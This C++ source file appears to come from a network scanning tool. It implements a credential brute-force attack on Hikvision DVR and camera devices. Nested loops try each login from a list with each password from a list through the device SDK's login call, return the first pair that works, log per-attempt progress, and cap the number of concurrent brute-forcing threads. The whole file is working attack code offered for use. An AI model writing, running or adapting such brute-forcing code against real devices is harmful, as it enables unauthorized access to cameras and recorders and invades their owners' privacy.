#include "HikvisionLogin.h"
#include "externData.h"
#include "FileUpdater.h"

bool HikVis::isInitialized = false;

void HikVis::hikInit(){
	//hik_init_ptr();
}

void HikVis::hikCleanup(){
	//hik_cleanup_ptr();
}

lopaStr HikVis::hikLogin(const char * sDVRIP, int wDVRPort) 
{
	lopaStr lps = { "UNKNOWN", "", "" };
	int passCounter = 0;

	for (int i = 0; i < MaxLogin; ++i) {
		for (int j = 0; j < MaxPass; ++j) {
			FileUpdater::cv.wait(FileUpdater::lk, []{return FileUpdater::ready; });
			if (!globalScanFlag) return lps;

			NET_DVR_DEVICEINFO_V30 *info;
			hik_init_ptr();
			if (hik_login_ptr(sDVRIP, wDVRPort, loginLst[i], passLst[j], info) == 0) {
				strcpy(lps.login, loginLst[i]);
				strcpy(lps.pass, passLst[j]);
				hik_cleanup_ptr();
				return lps;
			}
			hik_cleanup_ptr();

			if (BALogSwitched) stt->doEmitionBAData("HV: " + QString(sDVRIP) + ":" + QString::number(wDVRPort) +
				"; l/p: " + QString(loginLst[i]) + ":" + QString(passLst[j]) + ";	- Progress: (" +
				QString::number((++passCounter / (double)(MaxPass*MaxLogin)) * 100).mid(0, 4) + "%)");

			Sleep(100);
		}
	}

	return lps;
}

lopaStr HikVis::HVLobby(const char *ip, const int port) {
	if (gMaxBrutingThreads > 0) {

		while (BrutingThrds >= gMaxBrutingThreads) Sleep(1000);

		++baCount;
		++BrutingThrds;
		const lopaStr &lps = hikLogin(ip, port);
		--BrutingThrds;

		return lps;
	}
	else {
		lopaStr lps = { "UNKNOWN", "", "" };
		return lps;
	}
}